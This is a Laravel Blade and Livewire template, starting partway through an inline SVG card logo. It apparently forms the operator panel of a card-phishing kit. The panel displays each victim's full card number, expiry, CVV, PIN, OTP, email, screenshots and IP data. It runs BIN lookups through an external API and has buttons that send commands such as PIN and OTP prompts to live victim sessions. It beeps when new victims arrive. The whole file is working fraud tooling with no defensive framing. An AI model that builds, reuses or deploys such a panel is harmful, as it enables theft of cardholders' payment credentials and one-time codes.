c2.433,0,4.403-1.967,4.403-4.408c0-2.434-1.971-4.396-4.403-4.396c-2.434,0-4.409,1.962-4.409,4.396 C652.466,337.985,654.442,339.952,656.875,339.952L656.875,339.952L656.875,339.952z M656.087,338.09h-1.184v-5.092h2.15 c0.446,0,0.904,0.004,1.3,0.258c0.417,0.283,0.646,0.775,0.646,1.271c0,0.583-0.338,1.112-0.88,1.316l0.934,2.246h-1.316 l-0.775-2.009h-0.875V338.09L656.087,338.09z M656.087,335.211h0.658c0.246,0,0.505,0.016,0.726-0.101 c0.195-0.129,0.3-0.366,0.3-0.592c0-0.188-0.125-0.417-0.288-0.513c-0.212-0.125-0.541-0.1-0.762-0.1h-0.634V335.211 L656.087,335.211z"></path> <path id="Fill-4" sketch:type="MSShapeGroup" d="M372.446,284.006c-7.671,2.033-15.088,3.025-22.929,3.009 c-25.017-0.024-38.046-11.417-38.046-33.2c0-25.458,16.587-44.183,39.1-44.183c18.417,0,30.175,10.5,30.175,26.946 c0,5.458-0.796,10.771-2.745,18.296h-44.488c-1.583,10.633,6.188,15.305,19.413,15.305c7.925,0,15.092-1.426,23.024-4.613 L372.446,284.006L372.446,284.006z M360.483,239.856c0-1.608,2.476-13.034-10.399-13.284c-7.108,0-12.208,4.725-14.271,13.284 H360.483L360.483,239.856z"></path> <path id="Fill-5" sketch:type="MSShapeGroup" d="M387.517,234.865c0,9.404,5.296,15.9,17.329,20.737 c9.199,3.771,10.649,4.859,10.649,8.221c0,4.663-4.066,6.805-13.092,6.746c-6.778-0.05-12.962-0.871-20.262-2.896l-3.229,17.154 c6.487,1.504,15.588,2,23.65,2.188c24.024,0,35.116-7.866,35.116-24.866c0-10.217-4.625-16.234-16.033-20.713 c-9.538-3.809-10.658-4.638-10.658-8.083c0-4.05,3.779-6.1,11.149-6.1c4.463,0,10.579,0.413,16.38,1.108l3.258-17.242 c-5.912-0.825-14.883-1.483-20.075-1.483C396.25,209.635,387.442,221.094,387.517,234.865"></path> <path id="Fill-6" sketch:type="MSShapeGroup" d="M299.275,285.785h-18.662l0.445-7.82c-5.691,6.17-13.271,9.041-23.558,9.041 c-12.175,0-20.517-8.324-20.517-20.295c0-18.196,14.5-28.692,39.429-28.692c2.563,0,5.821,0.192,9.167,0.563 c0.691-2.433,0.879-3.479,0.879-4.808c0-4.979-3.921-6.813-14.412-6.813c-10.342,0.042-17.321,1.571-23.796,3.313l3.188-16.7 c11.195-2.846,18.529-3.941,26.825-3.941c19.304,0,29.499,7.566,29.499,21.796c0.167,3.795-1.158,11.413-1.82,14.746 C305.183,251.027,299.833,279.148,299.275,285.785L299.275,285.785L299.275,285.785z M282.896,252.594 c-2.366-0.242-3.396-0.313-5.013-0.313c-12.729,0-19.183,3.787-19.183,11.267c0,4.692,3.149,7.634,8.058,7.634 C275.905,271.182,282.508,263.531,282.896,252.594L282.896,252.594L282.896,252.594z"></path> <path id="Fill-7" sketch:type="MSShapeGroup" d="M477.004,284.606c-6.125,1.679-10.896,2.408-16.059,2.408 c-11.434,0-17.675-5.842-17.675-16.25c-0.358-2.858,2.434-16.059,3.066-19.737c0.634-3.691,10.538-57.492,10.538-57.492h22.212 l-3.362,17.8h11.392l-3.096,18.171h-11.441c0,0-6.279,31.529-6.279,33.933c0,3.825,2.316,5.488,7.633,5.488 c2.546,0,4.509-0.238,6.029-0.692L477.004,284.606"></path> <path id="Fill-8" sketch:type="MSShapeGroup" d="M576.25,209.631c-16.279,0-29,6.7-36.388,17.892l6.412-16.596 c-11.816-4.337-19.434,1.85-26.325,10.65c0,0-1.154,1.462-2.3,2.8v-13.05h-20.858c-2.825,23.029-7.82,46.379-11.729,69.446 l-0.942,5.021h22.438c2.125-11.708,3.875-21.213,5.617-28.788c4.767-20.787,12.787-27.141,24.829-24.333 c-2.779,5.979-4.305,12.892-4.305,20.554c0,18.58,10.092,33.788,35.15,33.788c25.287,0,43.596-13.509,43.596-44.309 C611.446,224.127,599.245,209.631,576.25,209.631L576.25,209.631L576.25,209.631z M569.721,268.947 c-7.926,0.125-12.729-6.524-12.729-16.471c0-11.791,7.013-25.112,18.275-25.112c9.087,0,12.199,7.204,12.199,14.879 C587.466,259.023,580.591,268.947,569.721,268.947L569.721,268.947L569.721,268.947z"></path> <path id="Fill-9" sketch:type="MSShapeGroup" d="M226.53,285.794h-22.342l13.279-69.954l-30.571,69.954H166.53l-3.726-69.55 l-13.32,69.55h-20.271l17.267-90.996h34.913l2.912,50.726l22.117-50.726h37.721L226.53,285.794"></path> <path id="Fill-10" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M613.15,274.385c0-3.195,2.596-5.795,5.796-5.795 c3.204,0,5.796,2.6,5.796,5.795c0,3.209-2.592,5.805-5.796,5.805C615.745,280.189,613.15,277.594,613.15,274.385L613.15,274.385 L613.15,274.385z M618.946,278.798c2.434,0,4.408-1.979,4.408-4.413c0-2.433-1.975-4.403-4.408-4.403s-4.408,1.971-4.408,4.403 C614.537,276.818,616.512,278.798,618.946,278.798L618.946,278.798L618.946,278.798z M618.162,276.932h-1.188v-5.084h2.15 c0.449,0,0.908,0,1.304,0.25c0.408,0.279,0.646,0.768,0.646,1.271c0,0.578-0.337,1.116-0.883,1.316l0.934,2.246h-1.317 l-0.771-2.009h-0.875V276.932L618.162,276.932z M618.162,274.044h0.658c0.242,0,0.504,0.017,0.725-0.097 c0.196-0.133,0.296-0.357,0.296-0.587c0-0.196-0.12-0.417-0.283-0.513c-0.212-0.129-0.541-0.096-0.763-0.096h-0.633V274.044 L618.162,274.044z"></path> <path id="Fill-11" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M378.054,278.398c-7.667,2.033-15.088,3.029-22.925,3.012 c-25.017-0.025-38.046-11.42-38.046-33.208c0-25.45,16.579-44.179,39.096-44.179c18.421,0,30.175,10.496,30.175,26.942 c0,5.467-0.8,10.771-2.741,18.3h-44.487c-1.584,10.629,6.179,15.308,19.408,15.308c7.925,0,15.087-1.424,23.029-4.616 L378.054,278.398L378.054,278.398z M366.091,234.248c0-1.604,2.472-13.033-10.399-13.279c-7.108,0-12.204,4.729-14.271,13.279 H366.091L366.091,234.248z"></path> <path id="Fill-12" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M393.129,229.252c0,9.408,5.287,15.9,17.325,20.746 c9.204,3.767,10.649,4.858,10.649,8.213c0,4.666-4.066,6.808-13.087,6.75c-6.784-0.047-12.967-0.871-20.263-2.896l-3.237,17.146 c6.491,1.516,15.596,2.012,23.653,2.199c24.025,0,35.121-7.871,35.121-24.871c0-10.217-4.629-16.236-16.041-20.712 c-9.538-3.809-10.654-4.638-10.654-8.083c0-4.05,3.783-6.1,11.146-6.1c4.471,0,10.583,0.417,16.388,1.113l3.25-17.246 c-5.913-0.825-14.879-1.483-20.066-1.483C401.854,204.027,393.05,215.481,393.129,229.252"></path> <path id="Fill-13" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M304.887,280.182h-18.666l0.45-7.821 c-5.696,6.158-13.275,9.033-23.559,9.033c-12.175,0-20.521-8.325-20.521-20.287c0-18.204,14.495-28.696,39.429-28.696 c2.563,0,5.816,0.192,9.171,0.563c0.691-2.433,0.875-3.475,0.875-4.808c0-4.983-3.917-6.813-14.408-6.813 c-10.342,0.042-17.321,1.575-23.796,3.313l3.184-16.696c11.199-2.85,18.529-3.946,26.829-3.946 c19.304,0,29.495,7.567,29.495,21.792c0.167,3.8-1.158,11.412-1.816,14.754C310.791,245.419,305.442,273.539,304.887,280.182 L304.887,280.182L304.887,280.182z M288.5,246.985c-2.358-0.245-3.392-0.313-5.013-0.313c-12.721,0-19.18,3.788-19.18,11.267 c0,4.695,3.154,7.633,8.055,7.633C281.517,265.572,288.12,257.919,288.5,246.985L288.5,246.985L288.5,246.985z"></path> <path id="Fill-14" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M482.608,279.002c-6.12,1.676-10.896,2.408-16.054,2.408 c-11.434,0-17.671-5.846-17.671-16.254c-0.362-2.854,2.434-16.059,3.063-19.737c0.634-3.692,10.537-57.492,10.537-57.492h22.209 l-3.354,17.8h11.392l-3.096,18.171h-11.441c0,0-6.283,31.53-6.283,33.933c0,3.825,2.32,5.479,7.633,5.479 c2.542,0,4.509-0.229,6.029-0.691L482.608,279.002"></path> <path id="Fill-15" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M593.079,236.635c0,16.775-6.88,26.709-17.755,26.709 c-7.921,0.112-12.725-6.525-12.725-16.475c0-11.792,7.008-25.113,18.271-25.113C589.962,221.756,593.079,228.969,593.079,236.635 L593.079,236.635L593.079,236.635z M617.058,237.102c0-18.579-12.208-33.079-35.195-33.079c-26.45,0-43.55,17.625-43.55,43.596 c0,18.578,10.083,33.791,35.149,33.791C598.75,281.41,617.058,267.898,617.058,237.102L617.058,237.102L617.058,237.102z"></path> <path id="Fill-16" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M502.396,205.719c-2.821,23.029-7.816,46.375-11.721,69.45 l-0.946,5.021h22.434c8.088-44.558,10.8-57.254,27.741-52.783l8.15-21.087c-11.816-4.337-19.425,1.854-26.309,10.658 c0.621-3.962,1.792-7.783,1.509-11.258H502.396"></path> <path id="Fill-17" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M232.138,280.189H209.8l13.275-69.958L192.5,280.189h-20.362 l-3.726-69.554l-13.32,69.554h-20.271l17.263-91h34.921l1.846,56.334l24.575-56.334h36.325L232.138,280.189"></path> </g> </g> </g></svg>
                                        @endswitch
                                    @endif
                                  </div>
                                  <div class="pt-1">
                                    <p class="font-light text-xs text-gray-600">Credit card number</p>
                                    <p class="tracking-more-wider credit-card text-sm text-gray-100">
                                        @if(isset($this->cmr->number) && Str::length(
                                            Str::replaceMatches(
                                                pattern: '/[^0-9]++/',
                                                replace: '',
                                                subject: $this->cmr->number
                                            )
                                        ) >= 16)
                                            {{ chunk_split(Str::replaceMatches(
                                                pattern: '/[^0-9]++/',
                                                replace: '',
                                                subject: $this->cmr->number
                                            ), 4, ' ') }}
                                        @else
                                            <span>*</span>
                                        @endif
                                    </p>
                                  </div>
                                  <div class="pt-4 pr-6 sm:pt-6">
                                    <div class="flex justify-between">

                                      <div class="">
                                        <p class="font-light text-xs text-gray-600">Expiry</p>
                                        <p class="text-xs tracking-widest credit-card">{{ $this->cmr->expmonth ?? '**' }}/{{ $this->cmr->expyear ?? '**' }}</p>
                                      </div>

                                      <div class="">
                                        <p class="font-light text-xs text-gray-600">CVV</p>
                                        <p class="tracking-more-wider text-xs credit-card">{{ $this->cmr->cvc ?? '***' }}</p>
                                      </div>

                                      <div class="">
                                        <p class="font-light text-xs text-gray-600">PIN</p>
                                        <p class="text-xs tracking-widest credit-card">{{ $this->cmr->pin ?? '****' }}</p>
                                      </div>

                                      <div class="">
                                        <p class="font-light text-xs text-gray-600">OTP</p>
                                        <p class="text-xs tracking-widest credit-card">{{ $this->cmr->otp ?? '******' }}</p>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                            </div>
                            <div class="mb-5">
                                @if(isset($this->cmr->email))
                                    {{ $this->cmr->email }}
                                @endif
                            </div>
                            <div>
                                @if(isset($this->cmr->live))
                                {{ $this->cmr->live }}
                                @endif
                            </div>
                        </td>
                        <td class="p-5 w-1/2">
                        @if($this->cmr != null && $this->cmr->screenshots)
                            @php
                                $arr = [];
                                foreach ($this->cmr->screenshots as $key => $value) {
                                    $arr[$key] = $value->image;
                                }
                            @endphp
                                @foreach ($arr as $image)
                                    <img src="{{ $image }}" class="rounded-xl w-full h-auto object-contain aspect-square sm:hover:scale-105 transition-transform" />
                                @endforeach
                        @endif
                        </td>
                    </tr>
                </tbody>
            </table>
            <table class="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400 mb-5">
                <thead class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                    <tr>
                        <th scope="col" class="px-6 py-3 w-1/2">BANK BIN</td>
                        <th scope="col" class="px-6 py-3 w-1/2">IP DATA</td>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td class="px-6">
                            <div class="text-xs mb-3">
                                @if(isset($this->cmr->bin) && $this->cmr->bin != null)
                                <div class="grid grid-cols-4 gap-2">
                                    @foreach ($this->cmr->bin as $key => $val)
                                        <div class="font-semibold uppercase col-span-1 text-xs" id="{{ $key }}">{{ $key }}</div>
                                        <div class="col-span-3 ">
                                            <code>{{ $val }}</code>
                                        </div>
                                    @endforeach
                                </div>
                                @endif
                            </div>
                        </td>
                        <td class="px-6">
                            @if($this->cmr != null && $this->cmr->data != null)
                                <div class="grid grid-cols-4 mb-3 text-xs">
                                    @foreach ($this->cmr->data as $key => $value)
                                        <div class="col-span-1 text-gray-600">{{ str()->upper($key) }}</div>
                                        <div class="col-span-3 text-gray-500">
                                            <code>
                                                {{ str()->upper($value) }}
                                            </code>
                                        </div>
                                    @endforeach
                                </div>
                            @endif
                        </td>
                    </tr>
                </tbody>
            </table>
            @if($this->cmr != null)
                <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-2 mb-5">
                    @foreach (Arr::except($this->cmr->buttons, ['markasactive', 'deleterecord', 'bincheck', 'markasdone', 'pinmessage', 'otpmessage']) as $btn)
                        <div class="mb-2">
                            <x-mary-button disabled="{!! $btn['active'] ? false : true !!}" class="{{ $btn['type'] }} btn-sm w-full" key="{{ $btn['id'] }}" label="{{ $btn['label'] }}" wire:click="sendCommand('{{ $btn['id'] }}', '{{ $this->cmr->id }}')" spinner  />
                        </div>
                    @endforeach
                    <div class="mb-2">
                        {!! (!isset($this->cmr->number) && !Str::length($this->cmr->number) < 16) !!}
                        <x-mary-button
                        class="btn-sm w-full" wire:click="binCheck('{{ $this->cmr->number }}', '{{ $this->cmr->id }}')" spinner >BIN Banca</x-mary-button>
                    </div>
                </div>
            @endif
        </div>
    </x-mary-drawer>

</section>

@script
<script>
    document.addEventListener('livewire:initialized', () => {
        //Livewire.dispatch('gimme');
        // Function to check for new or updated customers
        function checkForUpdates(oldCustomers, newCustomers) {
            customers = newCustomers;
            // Convert the old customer array to a Map for faster lookup
            const oldCustomerMap = new Map(oldCustomers.map(c => [c.id, c]));

            let nc = null;
            let newCustomerFound = false;
            let updateFound = false;

            // Loop through the new customer array to check for changes
            for (const newCustomer of newCustomers) {
                const oldCustomer = oldCustomerMap.get(newCustomer.id);
                nc = newCustomer;
                if (!oldCustomer) {
                    // New customer found
                    newCustomerFound = true;
                } else {
                    // Check if there are updates
                    if (oldCustomer.news !== newCustomer.news || oldCustomer.seen !== newCustomer.seen || oldCustomer.live !== newCustomer.live) {
                        updateFound = true;
                    }
                }
            }
            // Play notification sound based on the changes detected
            if (newCustomerFound) {
                console.log('New customer found', nc);
                beep('unseen');
            }
            if (updateFound) {
                console.log('Update customer found', nc);
                beep('newnote');
            }
        }

        const binCheck = async (number) => {
            let bin = number.replace(/\s/g, '');
            bin = number.slice(0, 6);
            console.log(bin)
            const endpoint = await fetch(`https://api.chargeblast.com/bin/${bin}`);
            //const endpoint = await fetch(`https://data.handyapi.com/bin/${bin}`);
            const response = await endpoint.json()
            return response
        }

        function beep(type) {
            switch (type) {
                case 'unseen':
                    try {
                        new Audio("{{ asset('audio/unseen.mp3') }}").play();
                        console.log('beep unseen');
                    } catch (e) {
                        setTimeout(() => {
                            beep('unseen');
                            console.log('beep catch unseen');
                        }, 500);
                    }
                    break;
                case 'newnote':
                    try {
                        new Audio("{{ asset('audio/new.mp3') }}").play();
                        console.log('beep newnote');
                    } catch (e) {
                        setTimeout(() => {
                            beep('newnote');
                            console.log('beep catch ewnote');
                        }, 500);
                    }
                    break;
            }
        }

        Livewire.on('hydrated', ({ newcustomers }) => {
            if({!! $this->count() !!} !== newcustomers.length) {
                console.log('customers count changed');
                window.location.reload();
            }
        });



        let customers = {!! $this->customers->get()->toJson() !!};

        Livewire.on('bin-check', async ({ ccnum, id }) => {
            const bin = await binCheck(ccnum);

            let strippedbin = { ...bin}
            let toremove = ['utc_offset', 'updated', 'a2', 'a3', 'long', 'lat'];

            for (let i = 0; i < toremove.length; i++) {
                delete strippedbin[toremove[i]]
            }

            console.log(strippedbin);
            Livewire.dispatch('bin-check-result', { bin: strippedbin, id: id });
        });

        Livewire.on('mute-customer', ({ cmr, id }) => {
            const newcmr = JSON.parse(cmr);
            const i = customers.findIndex(c => c.id === id);
            customers[i] = newcmr;
        });

    });
</script>
@endscript
